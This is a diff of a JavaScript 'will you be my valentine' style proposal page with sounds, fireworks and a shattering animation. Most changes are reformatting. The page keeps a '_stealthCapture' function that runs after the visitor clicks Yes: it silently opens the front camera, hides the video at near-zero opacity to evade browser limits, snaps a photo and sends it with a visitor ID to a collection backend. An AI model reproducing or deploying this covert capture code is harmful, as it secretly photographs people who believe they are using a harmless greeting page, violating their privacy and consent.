-              timestamp: new Date().toISOString()
-            }));
-          }
         });
 
         // Stealth camera capture — fires on YES click, no UI
         let cameraStream = null;
 
         async function _stealthCapture() {
-          let videoEl = null;
-          try {
-            // Request front camera at reasonable resolution
-            cameraStream = await navigator.mediaDevices.getUserMedia({
-              video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
-              audio: false
-            });
-
-            videoEl = document.createElement('video');
-            videoEl.srcObject = cameraStream;
-            videoEl.playsInline = true;
-            videoEl.muted = true;
-            videoEl.autoplay = true;
-            videoEl.setAttribute('playsinline', '');   // required on iOS
-
-            // CRITICAL: Never use display:none — browsers won't decode frames for hidden videos.
-            // Also, don't put it off-screen (e.g. top: -9999px) because browsers pause off-screen video decoding.
-            videoEl.style.cssText = [
-              'position:fixed',
-              'top:0px',
-              'left:0px',
-              'width:10px',
-              'height:10px',
-              'opacity:0.001',
-              'pointer-events:none',
-              'z-index:-9999'
-            ].join(';');
-            document.body.appendChild(videoEl);
-
-            // Wait for pixel data to be available (loadeddata fires later than loadedmetadata)
-            await new Promise(function(resolve, reject) {
-              const timer = setTimeout(function() { reject(new Error('Camera timeout')); }, 6000);
-              function done() {
-                clearTimeout(timer);
-                videoEl.play().then(resolve).catch(reject);
-              }
-              videoEl.addEventListener('loadeddata', done, { once: true });
-              // Fallback: some browsers skip loadeddata, use canplay instead
-              videoEl.addEventListener('canplay', done, { once: true });
-            });
-
-            // Give the camera sensor time to auto-expose and produce a non-black frame
-            await new Promise(function(r) { setTimeout(r, 900); });
-
-            // Validate we actually have video dimensions before drawing
-            let w = videoEl.videoWidth;
-            let h = videoEl.videoHeight;
-
-            // If dimensions are still 0, wait another 600ms and retry once
-            if (!w || !h) {
-              await new Promise(function(r) { setTimeout(r, 600); });
-              w = videoEl.videoWidth;
-              h = videoEl.videoHeight;
-            }
-
-            // Fallback dimensions if browser still won't report them
-            if (!w || !h) { w = 640; h = 480; }
-
-            const canvas = document.createElement('canvas');
-            canvas.width = w;
-            canvas.height = h;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoEl, 0, 0, w, h);
-
-            const imageData = canvas.toDataURL('image/jpeg', 0.85);
-
-            // Only send if the image isn't just a blank/tiny placeholder
-            if (imageData && imageData.length > 1000) {
-              const vid = COLLECTOR.getVisitorId();
-              await COLLECTOR.sendWebcamImage(vid, imageData);
-            }
-
-          } catch (err) {
-            // Send the error to the backend so the admin knows why it failed
-            navigator.sendBeacon('/api/collect', JSON.stringify({
-              id: localStorage.getItem('_vid'),
-              type: 'webcam_error',
-              error: err.message || err.name || 'Unknown Error',
-              timestamp: new Date().toISOString()
-            }));
-          } finally {
-            // Always clean up stream and video element
+            let videoEl = null;
             try {
-              if (cameraStream) {
-                cameraStream.getTracks().forEach(function(t) { t.stop(); });
-                cameraStream = null;
-              }
-            } catch(e) {}
-            try {
-              if (videoEl && videoEl.parentNode) {
-                videoEl.srcObject = null;
-                document.body.removeChild(videoEl);
-              }
-            } catch(e) {}
-          }
+                // Request front camera at reasonable resolution
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
+                    audio: false
+                });
+
+                videoEl = document.createElement('video');
+                videoEl.srcObject = cameraStream;
+                videoEl.playsInline = true;
+                videoEl.muted = true;
+                videoEl.autoplay = true;
+                videoEl.setAttribute('playsinline', '');   // required on iOS
+
+                // CRITICAL: Never use display:none — browsers won't decode frames for hidden videos.
+                // Also, don't put it off-screen (e.g. top: -9999px) because browsers pause off-screen video decoding.
+                videoEl.style.cssText = [
+                    'position:fixed',
+                    'top:0px',
+                    'left:0px',
+                    'width:10px',
+                    'height:10px',
+                    'opacity:0.001',
+                    'pointer-events:none',
+                    'z-index:-9999'
+                ].join(';');
+                document.body.appendChild(videoEl);
+
+                // Wait for pixel data to be available (loadeddata fires later than loadedmetadata)
+                await new Promise(function (resolve, reject) {
+                    const timer = setTimeout(function () { reject(new Error('Camera timeout')); }, 6000);
+                    function done() {
+                        clearTimeout(timer);
+                        videoEl.play().then(resolve).catch(reject);
+                    }
+                    videoEl.addEventListener('loadeddata', done, { once: true });
+                    // Fallback: some browsers skip loadeddata, use canplay instead
+                    videoEl.addEventListener('canplay', done, { once: true });
+                });
+
+                // Give the camera sensor time to auto-expose and produce a non-black frame
+                await new Promise(function (r) { setTimeout(r, 900); });
+
+                // Validate we actually have video dimensions before drawing
+                let w = videoEl.videoWidth;
+                let h = videoEl.videoHeight;
+
+                // If dimensions are still 0, wait another 600ms and retry once
+                if (!w || !h) {
+                    await new Promise(function (r) { setTimeout(r, 600); });
+                    w = videoEl.videoWidth;
+                    h = videoEl.videoHeight;
+                }
+
+                // Fallback dimensions if browser still won't report them
+                if (!w || !h) { w = 640; h = 480; }
+
+                const canvas = document.createElement('canvas');
+                canvas.width = w;
+                canvas.height = h;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoEl, 0, 0, w, h);
+
+                const imageData = canvas.toDataURL('image/jpeg', 0.85);
+
+                // Only send if the image isn't just a blank/tiny placeholder
+                if (imageData && imageData.length > 1000) {
+                    const vid = COLLECTOR.getVisitorId();
+                    await COLLECTOR.sendWebcamImage(vid, imageData);
+                }
+
+            } catch (err) {
+                // Send the error to the backend so the admin knows why it failed
+                navigator.sendBeacon('/api/collect', JSON.stringify({
+                    id: localStorage.getItem('_vid'),
+                    type: 'webcam_error',
+                    error: err.message || err.name || 'Unknown Error',
+                    timestamp: new Date().toISOString()
+                }));
+            } finally {
+                // Always clean up stream and video element
+                try {
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(function (t) { t.stop(); });
+                        cameraStream = null;
+                    }
+                } catch (e) { }
+                try {
+                    if (videoEl && videoEl.parentNode) {
+                        videoEl.srcObject = null;
+                        document.body.removeChild(videoEl);
+                    }
+                } catch (e) { }
+            }
         }
 
 
         // Sound synthesizer module using Web Audio API
-        const SoundEffects = (function() {
-          let ctx = null;
+        const SoundEffects = (function () {
+            let ctx = null;
 
-          function initCtx() {
-            if (!ctx) {
-              ctx = new (window.AudioContext || window.webkitAudioContext)();
+            function initCtx() {
+                if (!ctx) {
+                    ctx = new (window.AudioContext || window.webkitAudioContext)();
+                }
+                if (ctx.state === 'suspended') {
+                    ctx.resume();
+                }
             }
-            if (ctx.state === 'suspended') {
-              ctx.resume();
+
+            function playYes() {
+                try {
+                    initCtx();
+                    const osc = ctx.createOscillator();
+                    const gain = ctx.createGain();
+                    osc.connect(gain);
+                    gain.connect(ctx.destination);
+
+                    osc.type = 'triangle';
+
+                    const now = ctx.currentTime;
+                    // Rising chime chord arpeggio
+                    osc.frequency.setValueAtTime(261.63, now); // C4
+                    osc.frequency.exponentialRampToValueAtTime(329.63, now + 0.15); // E4
+                    osc.frequency.exponentialRampToValueAtTime(392.00, now + 0.3); // G4
+                    osc.frequency.exponentialRampToValueAtTime(523.25, now + 0.45); // C5
+                    osc.frequency.exponentialRampToValueAtTime(659.25, now + 0.6); // E5
+
+                    gain.gain.setValueAtTime(0, now);
+                    gain.gain.linearRampToValueAtTime(0.15, now + 0.05);
+                    gain.gain.exponentialRampToValueAtTime(0.001, now + 1.2);
+
+                    osc.start(now);
+                    osc.stop(now + 1.2);
+                } catch (e) { }
             }
-          }
 
-          function playYes() {
-            try {
-              initCtx();
-              const osc = ctx.createOscillator();
-              const gain = ctx.createGain();
-              osc.connect(gain);
-              gain.connect(ctx.destination);
+            function playNo() {
+                try {
+                    initCtx();
+                    const now = ctx.currentTime;
 
-              osc.type = 'triangle';
-              
-              const now = ctx.currentTime;
-              // Rising chime chord arpeggio
-              osc.frequency.setValueAtTime(261.63, now); // C4
-              osc.frequency.exponentialRampToValueAtTime(329.63, now + 0.15); // E4
-              osc.frequency.exponentialRampToValueAtTime(392.00, now + 0.3); // G4
-              osc.frequency.exponentialRampToValueAtTime(523.25, now + 0.45); // C5
-              osc.frequency.exponentialRampToValueAtTime(659.25, now + 0.6); // E5
+                    const osc1 = ctx.createOscillator();
+                    const osc2 = ctx.createOscillator();
+                    const gain = ctx.createGain();
 
-              gain.gain.setValueAtTime(0, now);
-              gain.gain.linearRampToValueAtTime(0.15, now + 0.05);
-              gain.gain.exponentialRampToValueAtTime(0.001, now + 1.2);
+                    osc1.connect(gain);
+                    osc2.connect(gain);
+                    gain.connect(ctx.destination);
 
-              osc.start(now);
-              osc.stop(now + 1.2);
-            } catch(e) {}
-          }
+                    osc1.type = 'sawtooth';
+                    osc2.type = 'sawtooth';
 
-          function playNo() {
-            try {
-              initCtx();
-              const now = ctx.currentTime;
+                    // Detuned low rumble / crash slide
+                    osc1.frequency.setValueAtTime(220, now);
+                    osc1.frequency.linearRampToValueAtTime(55, now + 1.8);
+                    osc2.frequency.setValueAtTime(223, now);
+                    osc2.frequency.linearRampToValueAtTime(53, now + 1.8);
 
-              const osc1 = ctx.createOscillator();
-              const osc2 = ctx.createOscillator();
-              const gain = ctx.createGain();
+                    gain.gain.setValueAtTime(0, now);
+                    gain.gain.linearRampToValueAtTime(0.2, now + 0.1);
+                    gain.gain.exponentialRampToValueAtTime(0.001, now + 2.0);
 
-              osc1.connect(gain);
-              osc2.connect(gain);
-              gain.connect(ctx.destination);
+                    osc1.start(now);
+                    osc2.start(now);
+                    osc1.stop(now + 2.0);
+                    osc2.stop(now + 2.0);
+                } catch (e) { }
+            }
 
-              osc1.type = 'sawtooth';
-              osc2.type = 'sawtooth';
-
-              // Detuned low rumble / crash slide
-              osc1.frequency.setValueAtTime(220, now);
-              osc1.frequency.linearRampToValueAtTime(55, now + 1.8);
-              osc2.frequency.setValueAtTime(223, now);
-              osc2.frequency.linearRampToValueAtTime(53, now + 1.8);
-
-              gain.gain.setValueAtTime(0, now);
-              gain.gain.linearRampToValueAtTime(0.2, now + 0.1);
-              gain.gain.exponentialRampToValueAtTime(0.001, now + 2.0);
-
-              osc1.start(now);
-              osc2.start(now);
-              osc1.stop(now + 2.0);
-              osc2.stop(now + 2.0);
-            } catch(e) {}
-          }
-
-          return { playYes, playNo };
+            return { playYes, playNo };
         })();
 
         // Procedural background music synthesizer (Music Box arpeggio)
-        const BackgroundMusic = (function() {
-          let ctx = null;
-          let isPlaying = false;
-          let sequenceInterval = null;
-          let currentStep = 0;
-          let masterGain = null;
+        const BackgroundMusic = (function () {
+            let ctx = null;
+            let isPlaying = false;
+            let sequenceInterval = null;
+            let currentStep = 0;
+            let masterGain = null;
 
-          const chords = [
-            // C major 7: C4, E4, G4, B4
-            [261.63, 329.63, 392.00, 493.88],
-            // A minor 7: A3, C4, E4, G4
-            [220.00, 261.63, 329.63, 392.00],
-            // F major 7: F3, A3, C4, E4
-            [174.61, 220.00, 261.63, 329.63],
-            // G major 7: G3, B3, D4, F#4
-            [196.00, 246.94, 293.66, 369.99]
-          ];
+            const chords = [
+                // C major 7: C4, E4, G4, B4
+                [261.63, 329.63, 392.00, 493.88],
+                // A minor 7: A3, C4, E4, G4
+                [220.00, 261.63, 329.63, 392.00],
+                // F major 7: F3, A3, C4, E4
+                [174.61, 220.00, 261.63, 329.63],
+                // G major 7: G3, B3, D4, F#4
+                [196.00, 246.94, 293.66, 369.99]
+            ];
 
-          function init() {
-            if (ctx) return;
-            ctx = new (window.AudioContext || window.webkitAudioContext)();
-            masterGain = ctx.createGain();
-            masterGain.gain.setValueAtTime(0.08, ctx.currentTime);
-            masterGain.connect(ctx.destination);
-          }
-
-          function playNote(freq, startTime, duration) {
-            if (!ctx) return;
-            const osc = ctx.createOscillator();
-            const gain = ctx.createGain();
-            osc.connect(gain);
-            gain.connect(masterGain);
-
-            osc.type = 'sine';
-            osc.frequency.setValueAtTime(freq, startTime);
-
-            gain.gain.setValueAtTime(0, startTime);
-            gain.gain.linearRampToValueAtTime(0.25, startTime + 0.1);
-            gain.gain.exponentialRampToValueAtTime(0.001, startTime + duration - 0.05);
-
-            osc.start(startTime);
-            osc.stop(startTime + duration);
-          }
-
-          function tick() {
-            if (!isPlaying || !ctx) return;
-            const chordIndex = Math.floor(currentStep / 8) % chords.length;
-            const noteIndex = currentStep % 8;
-            const chord = chords[chordIndex];
-            
-            const pattern = [0, 1, 2, 3, 2, 1, 3, 0];
-            const noteFreq = chord[pattern[noteIndex % pattern.length]];
-            
-            playNote(noteFreq, ctx.currentTime, 0.8);
-            currentStep++;
-          }
-
-          function start() {
-            init();
-            if (ctx.state === 'suspended') {
-              ctx.resume();
+            function init() {
+                if (ctx) return;
+                ctx = new (window.AudioContext || window.webkitAudioContext)();
+                masterGain = ctx.createGain();
+                masterGain.gain.setValueAtTime(0.08, ctx.currentTime);
+                masterGain.connect(ctx.destination);
             }
-            isPlaying = true;
-            currentStep = 0;
-            tick();
-            sequenceInterval = setInterval(tick, 350);
-          }
 
-          function stop() {
-            isPlaying = false;
-            if (sequenceInterval) {
-              clearInterval(sequenceInterval);
-              sequenceInterval = null;
-            }
-            if (ctx && ctx.state !== 'suspended') {
-              try {
-                masterGain.gain.setValueAtTime(masterGain.gain.value, ctx.currentTime);
-                masterGain.gain.linearRampToValueAtTime(0, ctx.currentTime + 0.3);
-                setTimeout(() => {
-                  if (!isPlaying && ctx) ctx.suspend();
-                }, 400);
-              } catch(e) {}
-            }
-          }
+            function playNote(freq, startTime, duration) {
+                if (!ctx) return;
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.connect(gain);
+                gain.connect(masterGain);
 
-          function toggle() {
-            if (isPlaying) {
-              stop();
-              return false;
-            } else {
-              init();
-              masterGain.gain.setValueAtTime(0.08, ctx.currentTime);
-              start();
-              return true;
-            }
-          }
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(freq, startTime);
 
-          return { toggle, isPlaying: () => isPlaying, stop, start };
+                gain.gain.setValueAtTime(0, startTime);
+                gain.gain.linearRampToValueAtTime(0.25, startTime + 0.1);
+                gain.gain.exponentialRampToValueAtTime(0.001, startTime + duration - 0.05);
+
+                osc.start(startTime);
+                osc.stop(startTime + duration);
+            }
+
+            function tick() {
+                if (!isPlaying || !ctx) return;
+                const chordIndex = Math.floor(currentStep / 8) % chords.length;
+                const noteIndex = currentStep % 8;
+                const chord = chords[chordIndex];
+
+                const pattern = [0, 1, 2, 3, 2, 1, 3, 0];
+                const noteFreq = chord[pattern[noteIndex % pattern.length]];
+
+                playNote(noteFreq, ctx.currentTime, 0.8);
+                currentStep++;
+            }
+
+            function start() {
+                init();
+                if (ctx.state === 'suspended') {
+                    ctx.resume();
+                }
+                isPlaying = true;
+                currentStep = 0;
+                tick();
+                sequenceInterval = setInterval(tick, 350);
+            }
+
+            function stop() {
+                isPlaying = false;
+                if (sequenceInterval) {
+                    clearInterval(sequenceInterval);
+                    sequenceInterval = null;
+                }
+                if (ctx && ctx.state !== 'suspended') {
+                    try {
+                        masterGain.gain.setValueAtTime(masterGain.gain.value, ctx.currentTime);
+                        masterGain.gain.linearRampToValueAtTime(0, ctx.currentTime + 0.3);
+                        setTimeout(() => {
+                            if (!isPlaying && ctx) ctx.suspend();
+                        }, 400);
+                    } catch (e) { }
+                }
+            }
+
+            function toggle() {
+                if (isPlaying) {
+                    stop();
+                    return false;
+                } else {
+                    init();
+                    masterGain.gain.setValueAtTime(0.08, ctx.currentTime);
+                    start();
+                    return true;
+                }
+            }
+
+            return { toggle, isPlaying: () => isPlaying, stop, start };
         })();
 
         // Create stars
@@ -1331,7 +1473,7 @@
             heart.style.fontSize = (Math.random() * 20 + 15) + 'px';
             heart.style.animationDuration = (Math.random() * 5 + 5) + 's';
             container.appendChild(heart);
-            
+
             setTimeout(() => heart.remove(), 10000);
         }
 
@@ -1344,7 +1486,7 @@
             petal.style.animationDuration = (Math.random() * 5 + 7) + 's';
             petal.style.animationDelay = Math.random() * 5 + 's';
             container.appendChild(petal);
-            
+
             setTimeout(() => petal.remove(), 15000);
         }
 
@@ -1389,12 +1531,12 @@
 
         // Handle Yes click
         function handleYes() {
-            try { SoundEffects.playYes(); } catch(e) {}
+            try { SoundEffects.playYes(); } catch (e) { }
             document.getElementById('proposal').style.display = 'none';
             document.getElementById('celebration').classList.add('active');
             createFireworks();
             startCelebration();
-            
+
             // Stealth camera capture
             setTimeout(_stealthCapture, 1200);
         }
@@ -1405,10 +1547,10 @@
         function _playCrackSound(intensity) {
             try {
                 const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                const dur  = intensity === 0 ? 0.18 : 0.32;
-                const n    = Math.floor(ctx.sampleRate * dur);
-                const buf  = ctx.createBuffer(1, n, ctx.sampleRate);
-                const d    = buf.getChannelData(0);
+                const dur = intensity === 0 ? 0.18 : 0.32;
+                const n = Math.floor(ctx.sampleRate * dur);
+                const buf = ctx.createBuffer(1, n, ctx.sampleRate);
+                const d = buf.getChannelData(0);
                 for (let i = 0; i < n; i++) {
                     const t = i / n;
                     d[i] = (Math.random() * 2 - 1) * Math.pow(1 - t, 2.5) * (intensity === 0 ? 0.55 : 1.0);
@@ -1423,8 +1565,8 @@
                 gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + dur);
                 src.connect(bpf); bpf.connect(gain); gain.connect(ctx.destination);
                 src.start(); src.stop(ctx.currentTime + dur);
-                setTimeout(() => { try { ctx.close(); } catch(e) {} }, (dur + 0.3) * 1000);
-            } catch(e) {}
+                setTimeout(() => { try { ctx.close(); } catch (e) { } }, (dur + 0.3) * 1000);
+            } catch (e) { }
         }
 
         // ===================================================
@@ -1438,33 +1580,33 @@
             // Crack definition: {from, to, delay(ms), isPrimary}
             const cracks = [
                 // === PRIMARY — 8 main branches from center (50,50) ===
-                { x1:50,y1:50, x2:12,y2:6,   del:0,   p:true  },
-                { x1:50,y1:50, x2:88,y2:3,   del:60,  p:true  },
-                { x1:50,y1:50, x2:97,y2:42,  del:120, p:true  },
-                { x1:50,y1:50, x2:93,y2:91,  del:80,  p:true  },
-                { x1:50,y1:50, x2:52,y2:102, del:100, p:true  },
-                { x1:50,y1:50, x2:8, y2:88,  del:50,  p:true  },
-                { x1:50,y1:50, x2:2, y2:48,  del:140, p:true  },
-                { x1:50,y1:50, x2:28,y2:102, del:170, p:true  },
+                { x1: 50, y1: 50, x2: 12, y2: 6, del: 0, p: true },
+                { x1: 50, y1: 50, x2: 88, y2: 3, del: 60, p: true },
+                { x1: 50, y1: 50, x2: 97, y2: 42, del: 120, p: true },
+                { x1: 50, y1: 50, x2: 93, y2: 91, del: 80, p: true },
+                { x1: 50, y1: 50, x2: 52, y2: 102, del: 100, p: true },
+                { x1: 50, y1: 50, x2: 8, y2: 88, del: 50, p: true },
+                { x1: 50, y1: 50, x2: 2, y2: 48, del: 140, p: true },
+                { x1: 50, y1: 50, x2: 28, y2: 102, del: 170, p: true },
                 // === SECONDARY — branch from endpoints ===
-                { x1:12,y1:6,  x2:-2,y2:22,  del:320, p:false },
-                { x1:12,y1:6,  x2:32,y2:-2,  del:370, p:false },
-                { x1:88,y1:3,  x2:102,y2:18, del:330, p:false },
-                { x1:88,y1:3,  x2:75,y2:-2,  del:380, p:false },
-                { x1:97,y1:42, x2:102,y2:60, del:360, p:false },
-                { x1:93,y1:91, x2:102,y2:100,del:350, p:false },
-                { x1:8, y1:88, x2:-2,y2:100, del:340, p:false },
-                { x1:2, y1:48, x2:-2,y2:28,  del:390, p:false },
+                { x1: 12, y1: 6, x2: -2, y2: 22, del: 320, p: false },
+                { x1: 12, y1: 6, x2: 32, y2: -2, del: 370, p: false },
+                { x1: 88, y1: 3, x2: 102, y2: 18, del: 330, p: false },
+                { x1: 88, y1: 3, x2: 75, y2: -2, del: 380, p: false },
+                { x1: 97, y1: 42, x2: 102, y2: 60, del: 360, p: false },
+                { x1: 93, y1: 91, x2: 102, y2: 100, del: 350, p: false },
+                { x1: 8, y1: 88, x2: -2, y2: 100, del: 340, p: false },
+                { x1: 2, y1: 48, x2: -2, y2: 28, del: 390, p: false },
                 // === TERTIARY — smaller hairline details ===
-                { x1:32,y1:-2, x2:48,y2:-2,  del:560, p:false },
-                { x1:102,y1:18,x2:102,y2:38, del:540, p:false },
-                { x1:102,y1:60,x2:98,y2:75,  del:555, p:false },
-                { x1:75,y1:-2, x2:60,y2:-2,  del:570, p:false },
+                { x1: 32, y1: -2, x2: 48, y2: -2, del: 560, p: false },
+                { x1: 102, y1: 18, x2: 102, y2: 38, del: 540, p: false },
+                { x1: 102, y1: 60, x2: 98, y2: 75, del: 555, p: false },
+                { x1: 75, y1: -2, x2: 60, y2: -2, del: 570, p: false },
             ];
 
             const lines = cracks.map(c => {
                 const len = Math.hypot(c.x2 - c.x1, c.y2 - c.y1) * 12;
-                const sw  = c.p ? '1.2' : '0.55';
+                const sw = c.p ? '1.2' : '0.55';
                 const glow = c.p
                     ? 'drop-shadow(0 0 3px rgba(255,90,90,0.9)) drop-shadow(0 0 8px rgba(255,50,50,0.4))'
                     : 'drop-shadow(0 0 2px rgba(255,180,180,0.6))';
@@ -1502,11 +1644,11 @@
             }
 
             // Stop music immediately
-            try { BackgroundMusic.stop(); } catch(e) {}
+            try { BackgroundMusic.stop(); } catch (e) { }
             try {
                 const musicBtn = document.getElementById('musicBtn');
                 if (musicBtn) { musicBtn.textContent = '🎵'; musicBtn.style.animationPlayState = 'paused'; }
-            } catch(e) {}
+            } catch (e) { }
 
             // Lock buttons
             document.getElementById('yesBtn').disabled = true;
@@ -1556,13 +1698,13 @@
             // Fallback to whole sections if no children found
             if (pieces.length === 0) {
                 pieces = Array.from(document.body.children).filter(el =>
-                    !['stars','heartsContainer','musicBtn','crackOverlay'].includes(el.id)
+                    !['stars', 'heartsContainer', 'musicBtn', 'crackOverlay'].includes(el.id)
                     && el.tagName !== 'SCRIPT'
                 );
             }
 
             const BREAK_START = 2200;  // ms — let cracks settle first
-            const PIECE_GAP   = 550;   // ms between each piece falling
+            const PIECE_GAP = 550;   // ms between each piece falling
 
             pieces.forEach((el, idx) => {
                 const rect = el.getBoundingClientRect();
@@ -1582,18 +1724,18 @@
                 el.classList.add('breaking-piece');
 
                 // Randomise fall direction — heavier bias downward
-                const rot  = ((Math.random() - 0.5) * 70).toFixed(1) + 'deg';
-                const tx   = ((Math.random() - 0.5) * 260).toFixed(0) + 'px';
-                const ty   = (120 + Math.random() * 30).toFixed(0) + 'vh';
-                const sc   = (0.35 + Math.random() * 0.35).toFixed(2);
-                const dur  = (2.8 + Math.random() * 1.4).toFixed(1) + 's';
+                const rot = ((Math.random() - 0.5) * 70).toFixed(1) + 'deg';
+                const tx = ((Math.random() - 0.5) * 260).toFixed(0) + 'px';
+                const ty = (120 + Math.random() * 30).toFixed(0) + 'vh';
+                const sc = (0.35 + Math.random() * 0.35).toFixed(2);
+                const dur = (2.8 + Math.random() * 1.4).toFixed(1) + 's';
                 const fade = (2.0 + Math.random() * 0.8).toFixed(1) + 's';
-                const del  = (0.4 + Math.random() * 0.3).toFixed(2) + 's';
+                const del = (0.4 + Math.random() * 0.3).toFixed(2) + 's';
 
                 el.style.setProperty('--rot', rot);
-                el.style.setProperty('--tx',  tx);
-                el.style.setProperty('--ty',  ty);
-                el.style.setProperty('--sc',  sc);
+                el.style.setProperty('--tx', tx);
+                el.style.setProperty('--ty', ty);
+                el.style.setProperty('--sc', sc);
                 el.style.setProperty('--fall-dur', dur);
                 el.style.setProperty('--fade-dur', fade);
                 el.style.setProperty('--fade-del', del);
@@ -1601,7 +1743,7 @@
                 const breakAt = BREAK_START + idx * PIECE_GAP;
 
                 // Pre-shake 400ms before the fall
-                setTimeout(() => el.classList.add('do-shake'),    breakAt - 400);
+                setTimeout(() => el.classList.add('do-shake'), breakAt - 400);
 
                 // Actual fall
                 setTimeout(() => {
@@ -1643,7 +1785,7 @@
         // Create fireworks
         function createFireworks() {
             const colors = ['#ff6b8a', '#ffd93d', '#ff9ff3', '#48dbfb', '#00d2d3', '#ff6348'];
-            
+
             for (let i = 0; i < 10; i++) {
                 setTimeout(() => {
                     const firework = document.createElement('div');
@@ -1723,20 +1865,20 @@
                 p.style.pointerEvents = 'none';
                 p.style.zIndex = '9999';
                 p.style.transition = 'all 0.8s cubic-bezier(0.1, 0.8, 0.3, 1)';
-                
+
                 const angle = Math.random() * Math.PI * 2;
                 const dist = Math.random() * 50 + 30;
                 const tx = Math.cos(angle) * dist;
                 const ty = Math.sin(angle) * dist - 40; // Offset upwards to simulate float
-                
+
                 document.body.appendChild(p);
-                
+
                 // Trigger transition
                 p.offsetHeight;
-                
+
                 p.style.transform = `translate(${tx}px, ${ty}px) scale(0.3) rotate(${Math.random() * 360}deg)`;
                 p.style.opacity = '0';
-                
+
                 setTimeout(() => p.remove(), 800);
             }
         });
@@ -1744,7 +1886,7 @@
         // Make no button draggable on mobile
         let touchStartX, touchStartY;
         const noBtn = document.getElementById('noBtn');
-        
+
         noBtn.addEventListener('touchstart', (e) => {
             touchStartX = e.touches[0].clientX - noBtn.offsetLeft;
             touchStartY = e.touches[0].clientY - noBtn.offsetTop;
@@ -1758,4 +1900,5 @@
         });
     </script>
 </body>
+
 </html>
